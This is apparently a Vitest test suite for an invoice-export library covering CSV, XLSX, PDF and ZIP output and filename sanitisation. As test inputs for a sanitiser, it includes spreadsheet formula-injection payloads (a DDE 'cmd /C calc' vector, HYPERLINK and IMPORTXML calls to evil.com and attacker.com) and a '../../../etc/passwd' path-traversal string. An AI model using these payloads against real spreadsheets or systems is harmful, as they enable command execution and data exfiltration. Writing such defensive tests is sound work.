import { describe, it, expect } from "vitest";
import JSZip from "jszip";
import * as XLSX from "xlsx";
import { generateInvoice } from "@/lib/gathr/demo-data";
import {
  buildFileName,
  buildSafeFileName,
  cleanPdfText,
  csvCell,
  invoicesToCsv,
  invoicesToPdfReport,
  invoicesToXlsx,
  invoicesToZip,
  invoiceToSinglePdf,
  sanitizeFileName,
  sanitizeFormula,
} from "@/lib/gathr/export";
import type { Invoice } from "@/lib/gathr/types";

function createTestInvoice(
  overrides: Partial<Invoice> = {},
  fieldOverrides: Record<string, string> = {},
): Invoice {
  const base = generateInvoice("TEST-001", {
    batchId: "B-TEST",
    sourceFile: "sample_scan.pdf",
    startPage: 1,
    seed: 42,
    baseDate: "2026-10-15T00:00:00Z",
  });

  const mergedFields = { ...base.fields };
  for (const [k, v] of Object.entries(fieldOverrides)) {
    if (k in mergedFields) {
      mergedFields[k as keyof typeof mergedFields] = {
        ...mergedFields[k as keyof typeof mergedFields],
        value: v,
      };
    }
  }

  return {
    ...base,
    ...overrides,
    fields: mergedFields,
  };
}

describe("Export Utilities — CSV Generation & Security", () => {
  it("includes UTF-8 BOM, all field headers, metadata columns, and escaped rows", () => {
    const inv1 = createTestInvoice(
      {
        id: "INV-101",
        status: "verified",
        sourceFile: "batch1.pdf",
        pages: [1, 2],
        batchId: "B-100",
      },
      { supplier: "Acme, Corp", invoiceNumber: 'INV "A"' },
    );
    const inv2 = createTestInvoice(
      {
        id: "INV-102",
        status: "needs_review",
        sourceFile: "batch1.pdf",
        pages: [3],
        batchId: "B-100",
      },
      { supplier: "Zenith Inc", invoiceNumber: "INV-B" },
    );

    const csv = invoicesToCsv([inv1, inv2]);

    // 1. Must start with UTF-8 BOM
    expect(csv.startsWith("\uFEFF")).toBe(true);

    // 2. Header check
    expect(csv).toContain(
      "Supplier name,GSTIN,Invoice number,Invoice date,Due date,Taxable value,CGST,SGST,IGST,Total amount,Currency,Status,Source file,Pages,Batch",
    );

    // 3. Proper escaping of commas and double quotes
    expect(csv).toContain('"Acme, Corp"');
    expect(csv).toContain('"INV ""A"""');

    // 4. Metadata present
    expect(csv).toContain("verified,batch1.pdf,1 2,B-100");
    expect(csv).toContain("needs_review,batch1.pdf,3,B-100");
  });

  it("protects against CSV and Spreadsheet formula injection (CWE-1236 / OWASP) across all required vectors", () => {
    // Direct triggers
    expect(sanitizeFormula("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
    expect(sanitizeFormula("+cmd")).toBe("'+cmd");
    expect(sanitizeFormula("+cmd|' /C calc'!A0")).toBe("'+cmd|' /C calc'!A0");
    expect(sanitizeFormula("-1+1")).toBe("'-1+1");
    // Legitimate financial numbers are NOT corrupted
    expect(sanitizeFormula("-100")).toBe("-100");
    expect(sanitizeFormula("-12.50")).toBe("-12.50");
    expect(sanitizeFormula("@SUM(A1)")).toBe("'@SUM(A1)");
    expect(sanitizeFormula("@HYPERLINK('http://evil.com')")).toBe("'@HYPERLINK('http://evil.com')");
    expect(sanitizeFormula("\tmalicious")).toBe("'\tmalicious");
    expect(sanitizeFormula("\rmalicious")).toBe("'\rmalicious");
    expect(sanitizeFormula("\nmalicious")).toBe("'\nmalicious");

    // Leading spaces followed by triggers
    expect(sanitizeFormula("   =SUM(A1:A10)")).toBe("'   =SUM(A1:A10)");
    expect(sanitizeFormula("   =1+1")).toBe("'   =1+1");
    expect(sanitizeFormula("  +cmd")).toBe("'  +cmd");
    expect(sanitizeFormula("  +2+2")).toBe("'  +2+2");
    expect(sanitizeFormula(" -1+1")).toBe("' -1+1");
    expect(sanitizeFormula("  -12.50")).toBe("  -12.50");
    expect(sanitizeFormula("   @SUM(A1)")).toBe("'   @SUM(A1)");

    // Leading tabs followed by triggers
    expect(sanitizeFormula("\t@SUM(A1)")).toBe("'\t@SUM(A1)");
    expect(sanitizeFormula(" \t@SUM(A1:B10)")).toBe("' \t@SUM(A1:B10)");
    expect(sanitizeFormula(" \t=1+1")).toBe("' \t=1+1");

    // Leading carriage return and newline
    expect(sanitizeFormula("\r=1+1")).toBe("'\r=1+1");
    expect(sanitizeFormula("\n=1+1")).toBe("'\n=1+1");
    expect(sanitizeFormula("\r\n+cmd")).toBe("'\r\n+cmd");

    // Normal safe text and ordinary invoice values unaffected
    expect(sanitizeFormula("INV-2026-001")).toBe("INV-2026-001");
    expect(sanitizeFormula("Safe Text")).toBe("Safe Text");
    expect(sanitizeFormula("Acme Corp 2026")).toBe("Acme Corp 2026");
    expect(sanitizeFormula("1500.00")).toBe("1500.00");
    expect(sanitizeFormula("")).toBe("");

    // Test cell escaping with formula protection
    const cellValue = csvCell("=1+1");
    expect(cellValue).toBe("'=1+1");

    const cellValueWithComma = csvCell("=SUM(A, B)");
    expect(cellValueWithComma).toBe('"\'=SUM(A, B)"');

    // Full invoice with injection attempt in invoiceNumber and supplier
    const maliciousInv = createTestInvoice(
      {},
      {
        supplier: "   =IMPORTXML('http://attacker.com')",
        invoiceNumber: "@evil-code",
      },
    );

    const csv = invoicesToCsv([maliciousInv]);
    expect(csv).toContain("'   =IMPORTXML('http://attacker.com')");
    expect(csv).toContain("'@evil-code");
  });

  it("handles international & Indian text without corruption in CSV", () => {
    const inv = createTestInvoice(
      {},
      {
        supplier: "टाटा मोटर्स (Tata Motors)",
        currency: "INR",
        total: "1,50,000.00",
      },
    );
    const csv = invoicesToCsv([inv]);
    expect(csv).toContain("टाटा मोटर्स (Tata Motors)");
    expect(csv).toContain("1,50,000.00");
  });

  it("preserves negative numbers in financial fields while neutralizing malicious text in CSV", () => {
    const inv = createTestInvoice(
      {},
      {
        supplier: "Acme Corp",
        invoiceNumber: "-1+1",
        total: "-100.00",
        taxableValue: "-90.00",
      },
    );
    const csv = invoicesToCsv([inv]);
    expect(csv).toContain("'-1+1");
    expect(csv).toContain(",-100.00,");
    expect(csv).toContain(",-90.00,");
  });

  it("handles empty invoice array safely", () => {
    const csv = invoicesToCsv([]);
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(csv).toContain("Supplier name");
    // Only header row
    const lines = csv.replace("\uFEFF", "").split("\r\n").filter(Boolean);
    expect(lines.length).toBe(1);
  });
});

describe("Export Utilities — XLSX Workbook Generation (SheetJS 0.20.3)", () => {
  it("generates a valid XLSX workbook preserving exact text without apostrophes and setting correct cell types", () => {
    const inv1 = createTestInvoice(
      { id: "INV-X1" },
      { supplier: "=cmd|' /C calc'!A0", invoiceNumber: "=1+1", total: "1500.50" },
    );
    const inv2 = createTestInvoice(
      { id: "INV-X2" },
      { supplier: "+12345", invoiceNumber: "-1+1", total: "-100.00" },
    );

    const xlsxBytes = invoicesToXlsx([inv1, inv2]);
    expect(xlsxBytes).toBeInstanceOf(Uint8Array);
    expect(xlsxBytes.length).toBeGreaterThan(1000);

    // Read workbook back with xlsx library to verify structure
    const wb = XLSX.read(xlsxBytes, { type: "array" });
    expect(wb.SheetNames).toContain("Invoices");

    const sheet = wb.Sheets["Invoices"];
    expect(sheet).toBeDefined();

    // Verify untrusted text preserves exact original strings without prepended apostrophes
    const jsonData = XLSX.utils.sheet_to_json<Record<string, unknown>>(sheet!);
    expect(jsonData.length).toBe(2);
    expect(jsonData[0]!["Supplier name"]).toBe("=cmd|' /C calc'!A0");
    expect(jsonData[0]!["Invoice number"]).toBe("=1+1");
    expect(jsonData[1]!["Supplier name"]).toBe("+12345");
    expect(jsonData[1]!["Invoice number"]).toBe("-1+1");

    // Verify cell types: untrusted text is explicitly string ('s') and formula property 'f' is deleted
    const supplierCell = sheet!["A2"];
    expect(supplierCell.t).toBe("s");
    expect(supplierCell.f).toBeUndefined();
    expect(supplierCell.v).toBe("=cmd|' /C calc'!A0");

    const invoiceNumCell = sheet!["C2"];
    expect(invoiceNumCell.t).toBe("s");
    expect(invoiceNumCell.f).toBeUndefined();
    expect(invoiceNumCell.v).toBe("=1+1");

    // Verify numeric financial values have cell type 'n'
    expect(typeof jsonData[0]!["Total amount"]).toBe("number");
    expect(jsonData[0]!["Total amount"]).toBe(1500.5);
    expect(typeof jsonData[1]!["Total amount"]).toBe("number");
    expect(jsonData[1]!["Total amount"]).toBe(-100);
  });
});

describe("Export Utilities — PDF Report & Summaries", () => {
  it("preserves Unicode Indian-language supplier names, Asian scripts, and ₹ symbol without deletion", async () => {
    // Indian regional languages
    expect(cleanPdfText("टाटा मोटर्स")).toBe("टाटा मोटर्स");
    expect(cleanPdfText("தமிழ்")).toBe("தமிழ்");
    expect(cleanPdfText("বাংলা")).toBe("বাংলা");
    // East Asian scripts
    expect(cleanPdfText("日本語")).toBe("日本語");
    // Currency symbol ₹ preserved
    expect(cleanPdfText("₹ 1,500.00")).toBe("₹ 1,500.00");
    expect(cleanPdfText("₹500")).toBe("₹500");
    expect(cleanPdfText("Total: ₹ 12,345.67")).toBe("Total: ₹ 12,345.67");
    expect(cleanPdfText(null, "Fallback")).toBe("Fallback");

    // Verify multi-page and single PDF generation with Indian supplier names
    const indianInvoices = [
      createTestInvoice(
        { id: "INV-IN-1" },
        {
          supplier: "टाटा मोटर्स लिमिटेड",
          currency: "₹",
          total: "₹ 1,50,000.00",
        },
      ),
      createTestInvoice({ id: "INV-IN-2" }, { supplier: "தமிழ்நாடு டிரேடர்ஸ்", currency: "INR" }),
      createTestInvoice({ id: "INV-IN-3" }, { supplier: "বাংলা এন্টারপ্রাইজ", currency: "INR" }),
      createTestInvoice({ id: "INV-IN-4" }, { supplier: "株式会社 日本語", currency: "JPY" }),
    ];

    const pdfBytes = await invoicesToPdfReport(indianInvoices);
    expect(pdfBytes).toBeInstanceOf(Uint8Array);
    expect(pdfBytes.length).toBeGreaterThan(1000);

    const singlePdfBytes = await invoiceToSinglePdf(indianInvoices[0]!);
    expect(singlePdfBytes).toBeInstanceOf(Uint8Array);
    expect(singlePdfBytes.length).toBeGreaterThan(1000);
  });

  it("preserves unusually long supplier names, invoice numbers, source filenames without truncation or clipping", async () => {
    const longInv = createTestInvoice(
      {
        id: "INV-LONG-001",
        sourceFile:
          "q1_fy26_enterprise_scanned_invoices_batch_001_raw_document_uncompressed_final_version.pdf",
        pages: [1, 2, 3, 4, 5],
        batchId: "BATCH-ENTERPRISE-2026-LONG-ID-99999",
      },
      {
        supplier:
          "International Conglomerate of Advanced Logistics, Manufacturing, Processing and Supply Chain Solutions Private Limited",
        invoiceNumber:
          "INV-2026-GLOBAL-TAX-INVOICE-ENTERPRISE-SERIAL-00000000000000000000000000000001",
        gstin: "27AAAAA0000A1Z5-SPECIAL-ECONOMIC-ZONE-REGISTRATION",
        invoiceDate: "2026-10-15-EXTENDED-DATE-FORMAT",
        dueDate: "2026-11-15-EXTENDED-DATE-FORMAT",
        taxableValue: "10,00,00,000.00",
        total: "11,80,00,000.00",
      },
    );

    const pdfBytes = await invoiceToSinglePdf(longInv);
    expect(pdfBytes).toBeInstanceOf(Uint8Array);
    expect(pdfBytes.length).toBeGreaterThan(1000);

    // Verify PDF header magic bytes
    const headerString = new TextDecoder().decode(pdfBytes.slice(0, 5));
    expect(headerString).toBe("%PDF-");
  });

  it("generates a valid multi-page PDF report with one invoice per page and disclaimer", async () => {
    const invoices = [
      createTestInvoice(
        { id: "INV-P1", batchId: "B-10" },
        {
          supplier: "A Very Long Supplier Name Incorporated Private Limited",
          currency: "₹",
          total: "₹ 50,000.00",
        },
      ),
      createTestInvoice({ id: "INV-P2", batchId: "B-10" }, { supplier: "Second Supplier Ltd" }),
      createTestInvoice({ id: "INV-P3", batchId: "B-10" }, { supplier: "Third Supplier LLP" }),
    ];

    const pdfBytes = await invoicesToPdfReport(invoices);
    expect(pdfBytes).toBeInstanceOf(Uint8Array);
    expect(pdfBytes.length).toBeGreaterThan(1000);

    // Verify PDF Magic Bytes (%PDF-)
    const headerString = new TextDecoder().decode(pdfBytes.slice(0, 8));
    expect(headerString).toContain("%PDF-");

    // Convert bytes to string to check embedded keywords
    const pdfText = new TextDecoder("latin1").decode(pdfBytes);
    expect(pdfText).toContain("Generated invoice summary");
    expect(pdfText).toContain("not original source document");
    expect(pdfText).toContain("gathr");
    expect(pdfText).toContain("INVOICE EXTRACTION RECORD");
  });

  it("generates an individual single-page PDF summary for a single invoice", async () => {
    const inv = createTestInvoice({ id: "INV-SINGLE" }, { supplier: "Single Supplier" });
    const pdfBytes = await invoiceToSinglePdf(inv);

    expect(pdfBytes).toBeInstanceOf(Uint8Array);
    const headerString = new TextDecoder().decode(pdfBytes.slice(0, 8));
    expect(headerString).toContain("%PDF-");
  });
});

describe("Export Utilities — ZIP Archive Generation", () => {
  it("generates a valid ZIP containing individual PDFs, CSV, and manifest.json", async () => {
    const invoices = [
      createTestInvoice(
        { id: "INV-Z1" },
        { supplier: "Vendor Alpha", invoiceNumber: "INV-101", invoiceDate: "2026-10-01" },
      ),
      createTestInvoice(
        { id: "INV-Z2" },
        { supplier: "Vendor Beta", invoiceNumber: "INV-102", invoiceDate: "2026-10-02" },
      ),
    ];

    const zipBlob = await invoicesToZip(invoices, "{vendor}_{invoice_number}.pdf");
    expect(zipBlob).toBeInstanceOf(Blob);
    expect(zipBlob.type).toBe("application/zip");
    expect(zipBlob.size).toBeGreaterThan(1000);

    // Read back archive using JSZip directly from Blob
    const zip = await JSZip.loadAsync(zipBlob);

    // 1. Verify invoices.csv
    expect(zip.file("invoices.csv")).not.toBeNull();
    const csvContent = await zip.file("invoices.csv")!.async("string");
    expect(csvContent).toContain("Vendor Alpha");
    expect(csvContent).toContain("Vendor Beta");

    // 2. Verify manifest.json
    expect(zip.file("manifest.json")).not.toBeNull();
    const manifestJson = JSON.parse(await zip.file("manifest.json")!.async("string"));
    expect(manifestJson.invoiceCount).toBe(2);
    expect(manifestJson.exportTimestamp).toBeDefined();
    expect(manifestJson.includedFiles).toContain("invoices.csv");
    expect(manifestJson.includedFiles).toContain("manifest.json");
    expect(manifestJson.includedFiles.length).toBe(4); // csv, manifest, 2 pdfs

    // 3. Verify individual PDF summaries inside invoices/ directory
    const pdfFiles = Object.keys(zip.files).filter((k) => k.endsWith(".pdf"));
    expect(pdfFiles.length).toBe(2);
    expect(pdfFiles).toContain("invoices/Vendor-Alpha_INV-101.pdf");
    expect(pdfFiles).toContain("invoices/Vendor-Beta_INV-102.pdf");

    // Check PDF magic bytes inside zip
    const firstPdfBytes = await zip.file("invoices/Vendor-Alpha_INV-101.pdf")!.async("uint8array");
    const pdfHeader = new TextDecoder().decode(firstPdfBytes.slice(0, 5));
    expect(pdfHeader).toBe("%PDF-");
  });

  it("handles duplicate filenames inside ZIP without overwriting files", async () => {
    // All invoices produce identical base name: Vendor-Same_INV-DUP.pdf
    const inv1 = createTestInvoice(
      { id: "INV-DUP1" },
      { supplier: "Vendor Same", invoiceNumber: "INV-DUP", invoiceDate: "2026-10-01" },
    );
    const inv2 = createTestInvoice(
      { id: "INV-DUP2" },
      { supplier: "Vendor Same", invoiceNumber: "INV-DUP", invoiceDate: "2026-10-01" },
    );
    const inv3 = createTestInvoice(
      { id: "INV-DUP3" },
      { supplier: "Vendor Same", invoiceNumber: "INV-DUP", invoiceDate: "2026-10-01" },
    );

    const zipBlob = await invoicesToZip([inv1, inv2, inv3], "{vendor}_{invoice_number}.pdf");
    const zip = await JSZip.loadAsync(zipBlob);

    const pdfFiles = Object.keys(zip.files).filter((k) => k.endsWith(".pdf"));
    expect(pdfFiles.length).toBe(3);
    expect(pdfFiles).toContain("invoices/Vendor-Same_INV-DUP.pdf");
    expect(pdfFiles).toContain("invoices/Vendor-Same_INV-DUP (1).pdf");
    expect(pdfFiles).toContain("invoices/Vendor-Same_INV-DUP (2).pdf");
  });
});

describe("Filename Sanitization & Template Helpers", () => {
  it("sanitizes dangerous path and filesystem characters", () => {
    expect(sanitizeFileName("../../../etc/passwd")).toBe(".._.._.._etc_passwd");
    expect(sanitizeFileName("C:\\Windows\\System32\\file.pdf")).toBe("C_Windows_System32_file.pdf");
    expect(sanitizeFileName('report: *?"<>|')).toBe("report");
    expect(sanitizeFileName("   normal_name.pdf   ")).toBe("normal_name.pdf");
  });

  it("builds safe filenames with fallback and extension handling", () => {
    const inv = createTestInvoice(
      {},
      { supplier: "Acme", invoiceNumber: "001", invoiceDate: "2026-10-01" },
    );
    const existing = new Set<string>();

    const f1 = buildSafeFileName("{vendor}_{invoice_number}", inv, existing);
    expect(f1).toBe("Acme_001.pdf");
    expect(existing.has("Acme_001.pdf")).toBe(true);

    // Second call with same names produces de-duplicated name
    const f2 = buildSafeFileName("{vendor}_{invoice_number}", inv, existing);
    expect(f2).toBe("Acme_001 (1).pdf");

    const f3 = buildSafeFileName("{vendor}_{invoice_number}", inv, existing);
    expect(f3).toBe("Acme_001 (2).pdf");
  });

  it("handles template ending in .pdf without producing double extension .pdf.pdf", () => {
    const inv = createTestInvoice(
      {},
      { supplier: "Delta", invoiceNumber: "999", invoiceDate: "2026-10-01" },
    );
    const name = buildSafeFileName("{vendor}_{invoice_number}.pdf", inv);
    expect(name).toBe("Delta_999.pdf");
    expect(name.endsWith(".pdf.pdf")).toBe(false);
  });

  it("handles empty or whitespace template with safe fallback", () => {
    const inv = createTestInvoice(
      { id: "INV-FALLBACK" },
      { supplier: "", invoiceNumber: "", invoiceDate: "" },
    );
    const name = buildSafeFileName("   ", inv);
    expect(name.endsWith(".pdf")).toBe(true);
    expect(name).toBe("unknown_unknown_unknown.pdf");
  });

  it("builds safe filenames preserving Unicode script letters and combining marks", () => {
    const hindiInv = createTestInvoice(
      {},
      { supplier: "टाटा मोटर्स", invoiceNumber: "INV-101", invoiceDate: "2026-10-01" },
    );
    const name1 = buildSafeFileName("{vendor}_{invoice_number}.pdf", hindiInv);
    expect(name1).toBe("टाटा-मोटर्स_INV-101.pdf");

    const tamilInv = createTestInvoice({}, { supplier: "தமிழ்", invoiceNumber: "INV-202" });
    const name2 = buildSafeFileName("{vendor}_{invoice_number}", tamilInv);
    expect(name2).toBe("தமிழ்_INV-202.pdf");

    const jpInv = createTestInvoice({}, { supplier: "日本語", invoiceNumber: "INV-303" });
    const name3 = buildSafeFileName("{vendor}_{invoice_number}", jpInv);
    expect(name3).toBe("日本語_INV-303.pdf");
  });
});

describe("Export Performance & Limits Benchmarks", () => {
  it("generates exports within realistic performance thresholds for 50 records", async () => {
    const batch = Array.from({ length: 50 }, (_, i) =>
      createTestInvoice(
        { id: `BENCH-${i}`, batchId: "B-PERF" },
        {
          supplier: `Vendor ${i} Technologies Private Limited`,
          invoiceNumber: `INV-2026-${1000 + i}`,
          invoiceDate: "2026-10-15",
          total: `${(i + 1) * 1250}.00`,
        },
      ),
    );

    // 1. CSV Performance (50 records)
    const t0 = performance.now();
    const csv = invoicesToCsv(batch);
    const tCsv = performance.now() - t0;
    expect(csv.length).toBeGreaterThan(1000);
    expect(tCsv).toBeLessThan(100); // Expect < 100ms

    // 2. XLSX Performance (50 records)
    const t1 = performance.now();
    const xlsx = invoicesToXlsx(batch);
    const tXlsx = performance.now() - t1;
    expect(xlsx.length).toBeGreaterThan(5000);
    expect(tXlsx).toBeLessThan(300); // Expect < 300ms

    // 3. Multi-page PDF Report Performance (25 records)
    const t2 = performance.now();
    const pdf = await invoicesToPdfReport(batch.slice(0, 25));
    const tPdf = performance.now() - t2;
    expect(pdf.length).toBeGreaterThan(10000);
    expect(tPdf).toBeLessThan(1500); // Expect < 1500ms

    // 4. Combined ZIP Archive Performance (15 records with individual PDFs + CSV)
    const t3 = performance.now();
    const zip = await invoicesToZip(batch.slice(0, 15));
    const tZip = performance.now() - t3;
    expect(zip.size).toBeGreaterThan(10000);
    expect(tZip).toBeLessThan(2500); // Expect < 2500ms

    // Output measurements for reporting
    console.log(
      `[Export Benchmark] 50 CSV: ${tCsv.toFixed(2)}ms, 50 XLSX: ${tXlsx.toFixed(2)}ms, 25 PDF: ${tPdf.toFixed(2)}ms, 15 ZIP: ${tZip.toFixed(2)}ms`,
    );
  });
});
